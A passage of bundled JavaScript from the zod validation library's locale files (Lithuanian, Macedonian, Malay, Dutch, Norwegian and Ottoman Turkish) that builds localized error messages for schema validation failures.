  const t = typeof data;
  return parsedTypeFromType(t, data);
};
var parsedTypeFromType = (t, data = undefined) => {
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "skai\u010Dius";
    }
    case "bigint": {
      return "sveikasis skai\u010Dius";
    }
    case "string": {
      return "eilut\u0117";
    }
    case "boolean": {
      return "login\u0117 reik\u0161m\u0117";
    }
    case "undefined":
    case "void": {
      return "neapibr\u0117\u017Eta reik\u0161m\u0117";
    }
    case "function": {
      return "funkcija";
    }
    case "symbol": {
      return "simbolis";
    }
    case "object": {
      if (data === undefined)
        return "ne\u017Einomas objektas";
      if (data === null)
        return "nulin\u0117 reik\u0161m\u0117";
      if (Array.isArray(data))
        return "masyvas";
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
      return "objektas";
    }
    case "null": {
      return "nulin\u0117 reik\u0161m\u0117";
    }
  }
  return t;
};
var capitalizeFirstCharacter2 = (text) => {
  return text.charAt(0).toUpperCase() + text.slice(1);
};
function getUnitTypeFromNumber2(number5) {
  const abs = Math.abs(number5);
  const last = abs % 10;
  const last2 = abs % 100;
  if (last2 >= 11 && last2 <= 19 || last === 0)
    return "many";
  if (last === 1)
    return "one";
  return "few";
}
var error71 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "simbolis",
        few: "simboliai",
        many: "simboli\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi b\u016Bti ne ilgesn\u0117 kaip",
          notInclusive: "turi b\u016Bti trumpesn\u0117 kaip"
        },
        bigger: {
          inclusive: "turi b\u016Bti ne trumpesn\u0117 kaip",
          notInclusive: "turi b\u016Bti ilgesn\u0117 kaip"
        }
      }
    },
    file: {
      unit: {
        one: "baitas",
        few: "baitai",
        many: "bait\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi b\u016Bti ne didesnis kaip",
          notInclusive: "turi b\u016Bti ma\u017Eesnis kaip"
        },
        bigger: {
          inclusive: "turi b\u016Bti ne ma\u017Eesnis kaip",
          notInclusive: "turi b\u016Bti didesnis kaip"
        }
      }
    },
    array: {
      unit: {
        one: "element\u0105",
        few: "elementus",
        many: "element\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi tur\u0117ti ne daugiau kaip",
          notInclusive: "turi tur\u0117ti ma\u017Eiau kaip"
        },
        bigger: {
          inclusive: "turi tur\u0117ti ne ma\u017Eiau kaip",
          notInclusive: "turi tur\u0117ti daugiau kaip"
        }
      }
    },
    set: {
      unit: {
        one: "element\u0105",
        few: "elementus",
        many: "element\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi tur\u0117ti ne daugiau kaip",
          notInclusive: "turi tur\u0117ti ma\u017Eiau kaip"
        },
        bigger: {
          inclusive: "turi tur\u0117ti ne ma\u017Eiau kaip",
          notInclusive: "turi tur\u0117ti daugiau kaip"
        }
      }
    }
  };
  function getSizing(origin, unitType, inclusive, targetShouldBe) {
    const result = Sizable[origin] ?? null;
    if (result === null)
      return result;
    return {
      unit: result.unit[unitType],
      verb: result.verb[targetShouldBe][inclusive ? "inclusive" : "notInclusive"]
    };
  }
  const Nouns = {
    regex: "\u012Fvestis",
    email: "el. pa\u0161to adresas",
    url: "URL",
    emoji: "jaustukas",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO data ir laikas",
    date: "ISO data",
    time: "ISO laikas",
    duration: "ISO trukm\u0117",
    ipv4: "IPv4 adresas",
    ipv6: "IPv6 adresas",
    cidrv4: "IPv4 tinklo prefiksas (CIDR)",
    cidrv6: "IPv6 tinklo prefiksas (CIDR)",
    base64: "base64 u\u017Ekoduota eilut\u0117",
    base64url: "base64url u\u017Ekoduota eilut\u0117",
    json_string: "JSON eilut\u0117",
    e164: "E.164 numeris",
    jwt: "JWT",
    template_literal: "\u012Fvestis"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Gautas tipas ${parsedType6(issue3.input)}, o tik\u0117tasi - ${parsedTypeFromType(issue3.expected)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Privalo b\u016Bti ${stringifyPrimitive2(issue3.values[0])}`;
        return `Privalo b\u016Bti vienas i\u0161 ${joinValues2(issue3.values, "|")} pasirinkim\u0173`;
      case "too_big": {
        const origin = parsedTypeFromType(issue3.origin);
        const sizing = getSizing(issue3.origin, getUnitTypeFromNumber2(Number(issue3.maximum)), issue3.inclusive ?? false, "smaller");
        if (sizing?.verb)
          return `${capitalizeFirstCharacter2(origin ?? issue3.origin ?? "reik\u0161m\u0117")} ${sizing.verb} ${issue3.maximum.toString()} ${sizing.unit ?? "element\u0173"}`;
        const adj = issue3.inclusive ? "ne didesnis kaip" : "ma\u017Eesnis kaip";
        return `${capitalizeFirstCharacter2(origin ?? issue3.origin ?? "reik\u0161m\u0117")} turi b\u016Bti ${adj} ${issue3.maximum.toString()} ${sizing?.unit}`;
      }
      case "too_small": {
        const origin = parsedTypeFromType(issue3.origin);
        const sizing = getSizing(issue3.origin, getUnitTypeFromNumber2(Number(issue3.minimum)), issue3.inclusive ?? false, "bigger");
        if (sizing?.verb)
          return `${capitalizeFirstCharacter2(origin ?? issue3.origin ?? "reik\u0161m\u0117")} ${sizing.verb} ${issue3.minimum.toString()} ${sizing.unit ?? "element\u0173"}`;
        const adj = issue3.inclusive ? "ne ma\u017Eesnis kaip" : "didesnis kaip";
        return `${capitalizeFirstCharacter2(origin ?? issue3.origin ?? "reik\u0161m\u0117")} turi b\u016Bti ${adj} ${issue3.minimum.toString()} ${sizing?.unit}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Eilut\u0117 privalo prasid\u0117ti "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Eilut\u0117 privalo pasibaigti "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Eilut\u0117 privalo \u012Ftraukti "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Eilut\u0117 privalo atitikti ${_issue.pattern}`;
        return `Neteisingas ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Skai\u010Dius privalo b\u016Bti ${issue3.divisor} kartotinis.`;
      case "unrecognized_keys":
        return `Neatpa\u017Eint${issue3.keys.length > 1 ? "i" : "as"} rakt${issue3.keys.length > 1 ? "ai" : "as"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return "Rastas klaidingas raktas";
      case "invalid_union":
        return "Klaidinga \u012Fvestis";
      case "invalid_element": {
        const origin = parsedTypeFromType(issue3.origin);
        return `${capitalizeFirstCharacter2(origin ?? issue3.origin ?? "reik\u0161m\u0117")} turi klaiding\u0105 \u012Fvest\u012F`;
      }
      default:
        return "Klaidinga \u012Fvestis";
    }
  };
};
function lt_default2() {
  return {
    localeError: error71()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/mk.js
var error72 = () => {
  const Sizable = {
    string: { unit: "\u0437\u043D\u0430\u0446\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    file: { unit: "\u0431\u0430\u0458\u0442\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    array: { unit: "\u0441\u0442\u0430\u0432\u043A\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    set: { unit: "\u0441\u0442\u0430\u0432\u043A\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0431\u0440\u043E\u0458";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u043D\u0438\u0437\u0430";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0432\u043D\u0435\u0441",
    email: "\u0430\u0434\u0440\u0435\u0441\u0430 \u043D\u0430 \u0435-\u043F\u043E\u0448\u0442\u0430",
    url: "URL",
    emoji: "\u0435\u043C\u043E\u045F\u0438",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0443\u043C \u0438 \u0432\u0440\u0435\u043C\u0435",
    date: "ISO \u0434\u0430\u0442\u0443\u043C",
    time: "ISO \u0432\u0440\u0435\u043C\u0435",
    duration: "ISO \u0432\u0440\u0435\u043C\u0435\u0442\u0440\u0430\u0435\u045A\u0435",
    ipv4: "IPv4 \u0430\u0434\u0440\u0435\u0441\u0430",
    ipv6: "IPv6 \u0430\u0434\u0440\u0435\u0441\u0430",
    cidrv4: "IPv4 \u043E\u043F\u0441\u0435\u0433",
    cidrv6: "IPv6 \u043E\u043F\u0441\u0435\u0433",
    base64: "base64-\u0435\u043D\u043A\u043E\u0434\u0438\u0440\u0430\u043D\u0430 \u043D\u0438\u0437\u0430",
    base64url: "base64url-\u0435\u043D\u043A\u043E\u0434\u0438\u0440\u0430\u043D\u0430 \u043D\u0438\u0437\u0430",
    json_string: "JSON \u043D\u0438\u0437\u0430",
    e164: "E.164 \u0431\u0440\u043E\u0458",
    jwt: "JWT",
    template_literal: "\u0432\u043D\u0435\u0441"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue3.expected}, \u043F\u0440\u0438\u043C\u0435\u043D\u043E ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Invalid input: expected ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u0413\u0440\u0435\u0448\u0430\u043D\u0430 \u043E\u043F\u0446\u0438\u0458\u0430: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 \u0435\u0434\u043D\u0430 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u0433\u043E\u043B\u0435\u043C: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue3.origin ?? "\u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442\u0430"} \u0434\u0430 \u0438\u043C\u0430 ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0438"}`;
        return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u0433\u043E\u043B\u0435\u043C: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue3.origin ?? "\u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442\u0430"} \u0434\u0430 \u0431\u0438\u0434\u0435 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u043C\u0430\u043B: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue3.origin} \u0434\u0430 \u0438\u043C\u0430 ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u043C\u0430\u043B: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue3.origin} \u0434\u0430 \u0431\u0438\u0434\u0435 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0437\u0430\u043F\u043E\u0447\u043D\u0443\u0432\u0430 \u0441\u043E "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0437\u0430\u0432\u0440\u0448\u0443\u0432\u0430 \u0441\u043E "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0432\u043A\u043B\u0443\u0447\u0443\u0432\u0430 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u043E\u0434\u0433\u043E\u0430\u0440\u0430 \u043D\u0430 \u043F\u0430\u0442\u0435\u0440\u043D\u043E\u0442 ${_issue.pattern}`;
        return `Invalid ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0431\u0440\u043E\u0458: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0431\u0438\u0434\u0435 \u0434\u0435\u043B\u0438\u0432 \u0441\u043E ${issue3.divisor}`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "\u041D\u0435\u043F\u0440\u0435\u043F\u043E\u0437\u043D\u0430\u0435\u043D\u0438 \u043A\u043B\u0443\u0447\u0435\u0432\u0438" : "\u041D\u0435\u043F\u0440\u0435\u043F\u043E\u0437\u043D\u0430\u0435\u043D \u043A\u043B\u0443\u0447"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u043A\u043B\u0443\u0447 \u0432\u043E ${issue3.origin}`;
      case "invalid_union":
        return "\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441";
      case "invalid_element":
        return `\u0413\u0440\u0435\u0448\u043D\u0430 \u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442 \u0432\u043E ${issue3.origin}`;
      default:
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441`;
    }
  };
};
function mk_default2() {
  return {
    localeError: error72()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ms.js
var error73 = () => {
  const Sizable = {
    string: { unit: "aksara", verb: "mempunyai" },
    file: { unit: "bait", verb: "mempunyai" },
    array: { unit: "elemen", verb: "mempunyai" },
    set: { unit: "elemen", verb: "mempunyai" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "nombor";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "alamat e-mel",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "tarikh masa ISO",
    date: "tarikh ISO",
    time: "masa ISO",
    duration: "tempoh ISO",
    ipv4: "alamat IPv4",
    ipv6: "alamat IPv6",
    cidrv4: "julat IPv4",
    cidrv6: "julat IPv6",
    base64: "string dikodkan base64",
    base64url: "string dikodkan base64url",
    json_string: "string JSON",
    e164: "nombor E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Input tidak sah: dijangka ${issue3.expected}, diterima ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Input tidak sah: dijangka ${stringifyPrimitive2(issue3.values[0])}`;
        return `Pilihan tidak sah: dijangka salah satu daripada ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Terlalu besar: dijangka ${issue3.origin ?? "nilai"} ${sizing.verb} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elemen"}`;
        return `Terlalu besar: dijangka ${issue3.origin ?? "nilai"} adalah ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Terlalu kecil: dijangka ${issue3.origin} ${sizing.verb} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Terlalu kecil: dijangka ${issue3.origin} adalah ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `String tidak sah: mesti bermula dengan "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `String tidak sah: mesti berakhir dengan "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `String tidak sah: mesti mengandungi "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `String tidak sah: mesti sepadan dengan corak ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} tidak sah`;
      }
      case "not_multiple_of":
        return `Nombor tidak sah: perlu gandaan ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Kunci tidak dikenali: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Kunci tidak sah dalam ${issue3.origin}`;
      case "invalid_union":
        return "Input tidak sah";
      case "invalid_element":
        return `Nilai tidak sah dalam ${issue3.origin}`;
      default:
        return `Input tidak sah`;
    }
  };
};
function ms_default2() {
  return {
    localeError: error73()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/nl.js
var error74 = () => {
  const Sizable = {
    string: { unit: "tekens" },
    file: { unit: "bytes" },
    array: { unit: "elementen" },
    set: { unit: "elementen" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "getal";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "invoer",
    email: "emailadres",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datum en tijd",
    date: "ISO datum",
    time: "ISO tijd",
    duration: "ISO duur",
    ipv4: "IPv4-adres",
    ipv6: "IPv6-adres",
    cidrv4: "IPv4-bereik",
    cidrv6: "IPv6-bereik",
    base64: "base64-gecodeerde tekst",
    base64url: "base64 URL-gecodeerde tekst",
    json_string: "JSON string",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "invoer"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ongeldige invoer: verwacht ${issue3.expected}, ontving ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ongeldige invoer: verwacht ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ongeldige optie: verwacht \xE9\xE9n van ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Te lang: verwacht dat ${issue3.origin ?? "waarde"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementen"} bevat`;
        return `Te lang: verwacht dat ${issue3.origin ?? "waarde"} ${adj}${issue3.maximum.toString()} is`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Te kort: verwacht dat ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit} bevat`;
        }
        return `Te kort: verwacht dat ${issue3.origin} ${adj}${issue3.minimum.toString()} is`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Ongeldige tekst: moet met "${_issue.prefix}" beginnen`;
        }
        if (_issue.format === "ends_with")
          return `Ongeldige tekst: moet op "${_issue.suffix}" eindigen`;
        if (_issue.format === "includes")
          return `Ongeldige tekst: moet "${_issue.includes}" bevatten`;
        if (_issue.format === "regex")
          return `Ongeldige tekst: moet overeenkomen met patroon ${_issue.pattern}`;
        return `Ongeldig: ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ongeldig getal: moet een veelvoud van ${issue3.divisor} zijn`;
      case "unrecognized_keys":
        return `Onbekende key${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Ongeldige key in ${issue3.origin}`;
      case "invalid_union":
        return "Ongeldige invoer";
      case "invalid_element":
        return `Ongeldige waarde in ${issue3.origin}`;
      default:
        return `Ongeldige invoer`;
    }
  };
};
function nl_default2() {
  return {
    localeError: error74()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/no.js
var error75 = () => {
  const Sizable = {
    string: { unit: "tegn", verb: "\xE5 ha" },
    file: { unit: "bytes", verb: "\xE5 ha" },
    array: { unit: "elementer", verb: "\xE5 inneholde" },
    set: { unit: "elementer", verb: "\xE5 inneholde" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "tall";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "liste";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "e-postadresse",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dato- og klokkeslett",
    date: "ISO-dato",
    time: "ISO-klokkeslett",
    duration: "ISO-varighet",
    ipv4: "IPv4-omr\xE5de",
    ipv6: "IPv6-omr\xE5de",
    cidrv4: "IPv4-spekter",
    cidrv6: "IPv6-spekter",
    base64: "base64-enkodet streng",
    base64url: "base64url-enkodet streng",
    json_string: "JSON-streng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ugyldig input: forventet ${issue3.expected}, fikk ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ugyldig verdi: forventet ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ugyldig valg: forventet en av ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `For stor(t): forventet ${issue3.origin ?? "value"} til \xE5 ha ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementer"}`;
        return `For stor(t): forventet ${issue3.origin ?? "value"} til \xE5 ha ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `For lite(n): forventet ${issue3.origin} til \xE5 ha ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `For lite(n): forventet ${issue3.origin} til \xE5 ha ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Ugyldig streng: m\xE5 starte med "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Ugyldig streng: m\xE5 ende med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ugyldig streng: m\xE5 inneholde "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ugyldig streng: m\xE5 matche m\xF8nsteret ${_issue.pattern}`;
        return `Ugyldig ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ugyldig tall: m\xE5 v\xE6re et multiplum av ${issue3.divisor}`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "Ukjente n\xF8kler" : "Ukjent n\xF8kkel"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Ugyldig n\xF8kkel i ${issue3.origin}`;
      case "invalid_union":
        return "Ugyldig input";
      case "invalid_element":
        return `Ugyldig verdi i ${issue3.origin}`;
      default:
        return `Ugyldig input`;
    }
  };
};
function no_default2() {
  return {
    localeError: error75()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ota.js
var error76 = () => {
  const Sizable = {
    string: { unit: "harf", verb: "olmal\u0131d\u0131r" },
    file: { unit: "bayt", verb: "olmal\u0131d\u0131r" },
    array: { unit: "unsur", verb: "olmal\u0131d\u0131r" },
    set: { unit: "unsur", verb: "olmal\u0131d\u0131r" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "numara";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "saf";
        }
        if (data === null) {
          return "gayb";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "giren",
    email: "epostag\xE2h",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO heng\xE2m\u0131",
    date: "ISO tarihi",
    time: "ISO zaman\u0131",
    duration: "ISO m\xFCddeti",
    ipv4: "IPv4 ni\u015F\xE2n\u0131",
    ipv6: "IPv6 ni\u015F\xE2n\u0131",
    cidrv4: "IPv4 menzili",
    cidrv6: "IPv6 menzili",
    base64: "base64-\u015Fifreli metin",
    base64url: "base64url-\u015Fifreli metin",
    json_string: "JSON metin",
    e164: "E.164 say\u0131s\u0131",
    jwt: "JWT",
    template_literal: "giren"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `F\xE2sit giren: umulan ${issue3.expected}, al\u0131nan ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `F\xE2sit giren: umulan ${stringifyPrimitive2(issue3.values[0])}`;
        return `F\xE2sit tercih: m\xFBteberler ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Fazla b\xFCy\xFCk: ${issue3.origin ?? "value"}, ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elements"} sahip olmal\u0131yd\u0131.`;
        return `Fazla b\xFCy\xFCk: ${issue3.origin ?? "value"}, ${adj}${issue3.maximum.toString()} olmal\u0131yd\u0131.`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Fazla k\xFC\xE7\xFCk: ${issue3.origin}, ${adj}${issue3.minimum.toString()} ${sizing.unit} sahip olmal\u0131yd\u0131.`;
        }
        return `Fazla k\xFC\xE7\xFCk: ${issue3.origin}, ${adj}${issue3.minimum.toString()} olmal\u0131yd\u0131.`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `F\xE2sit metin: "${_issue.prefix}" ile ba\u015Flamal\u0131.`;
        if (_issue.format === "ends_with")
          return `F\xE2sit metin: "${_issue.suffix}" ile bitmeli.`;
        if (_issue.format === "includes")
          return `F\xE2sit metin: "${_issue.includes}" ihtiv\xE2 etmeli.`;
        if (_issue.format === "regex")
          return `F\xE2sit metin: ${_issue.pattern} nak\u015F\u0131na uymal\u0131.`;
        return `F\xE2sit ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `F\xE2sit say\u0131: ${issue3.divisor} kat\u0131 olmal\u0131yd\u0131.`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan anahtar ${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `${issue3.origin} i\xE7in tan\u0131nmayan anahtar var.`;
      case "invalid_union":
        return "Giren tan\u0131namad\u0131.";
      case "invalid_element":
        return `${issue3.origin} i\xE7in tan\u0131nmayan k\u0131ymet var.`;
      default:
        return `K\u0131ymet tan\u0131namad\u0131.`;
    }
  };
};
function ota_default2() {
  return {
    localeError: error76()
  };
